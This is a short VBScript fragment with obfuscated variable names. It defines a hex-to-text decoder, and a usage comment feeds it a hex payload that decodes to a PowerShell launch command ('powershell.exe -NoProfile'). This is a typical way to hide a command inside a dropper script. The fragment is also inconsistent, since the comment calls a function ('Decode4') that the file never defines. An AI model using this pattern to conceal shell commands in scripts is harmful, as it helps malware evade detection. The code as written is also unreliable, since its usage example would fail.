Function Decode22(h19_mWxfOK)
    Dim r20_AYaYHQIhL, i21_e_JobjOX, b22_fSlSDCfZs
    r20_AYaYHQIhL = ""
    For i21_e_JobjOX = 1 To Len(h19_mWxfOK) Step 2
        b22_fSlSDCfZs = CLng("&H" & Mid(h19_mWxfOK, i21_e_JobjOX, 2))
        r20_AYaYHQIhL = r20_AYaYHQIhL & Chr(b22_fSlSDCfZs)
    Next
    Decode22 = r20_AYaYHQIhL
End Function

'' Complete script usage:
'' Dim hexPayload
'' hexPayload = "706f7765727368656c6c2e657865202d4e6f50726f66696c65"
'' Dim result
'' result = Decode4(hexPayload)
'' WScript.Echo result
